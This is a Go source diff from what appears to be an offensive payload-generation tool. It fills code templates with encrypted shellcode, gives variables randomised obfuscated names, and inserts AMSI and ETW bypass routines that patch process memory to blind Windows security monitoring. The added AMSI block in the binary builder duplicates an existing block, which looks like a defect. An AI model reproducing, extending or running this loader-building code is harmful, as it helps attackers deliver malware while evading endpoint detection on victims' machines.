@@ -188,11 +188,6 @@ func WriteProcessMemory_Buff(number string, b64number int) (string, string, stri
 	WriteProcessMemory.Variables["nSize"] = Cryptor.VarNumberLength(4, 9)
 	WriteProcessMemory.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(4, 9)
 
-	WriteProcessMemory.Variables["b64"] = Cryptor.VarNumberLength(4, 9)
-	WriteProcessMemory.Variables["sum"] = Cryptor.VarNumberLength(4, 9)
-	WriteProcessMemory.Variables["decoded"] = Cryptor.VarNumberLength(4, 9)
-	WriteProcessMemory.Variables["number"] = number
-
 	buffer.Reset()
 	WriteProcessMemoryTemplate, err := template.New("WriteProcessMemory").Parse(Struct.WriteProcessMemory_Function())
 	if err != nil {
@@ -397,15 +392,16 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 		AMSI_Function, AMSI := AMSI_Buff(DLL.Variables["WriteProcessMemory"])
 		DLL.Variables["AMSI_Function"] = AMSI_Function
 		DLL.Variables["AMSI"] = AMSI + "()"
+		DLL.Variables["Windows_Import"] = `"golang.org/x/sys/windows"`
 
 	} else {
 		DLL.Variables["AMSI_Function"] = ""
 		DLL.Variables["AMSI"] = ""
+		DLL.Variables["Windows_Import"] = ``
 	}
 
 	if ETW == false || AMSI == false {
-		DLL.Variables["HEX_Import"] = `"encoding/hex"
-		"encoding/base64"`
+		DLL.Variables["HEX_Import"] = `"encoding/hex"`
 	} else {
 		DLL.Variables["HEX_Import"] = ``
 	}
@@ -764,6 +760,21 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["ETW"] = ""
 		Binary.Variables["ETW_Function"] = ""
 		Binary.Variables["B64"] = ``
+	}
+	if AMSI == false {
+		AMSI_Function, AMSI := AMSI_Buff(Binary.Variables["WriteProcessMemory"])
+		Binary.Variables["AMSI_Function"] = AMSI_Function
+		Binary.Variables["AMSI"] = AMSI + "()"
+
+	} else {
+		Binary.Variables["AMSI_Function"] = ""
+		Binary.Variables["AMSI"] = ""
+	}
+
+	if ETW == false || AMSI == false {
+		Binary.Variables["HEX_Import"] = `"encoding/hex"`
+	} else {
+		Binary.Variables["HEX_Import"] = ``
 	}
 	if AMSI == false {
 		AMSI_Function, AMSI := AMSI_Buff(Binary.Variables["WriteProcessMemory"])
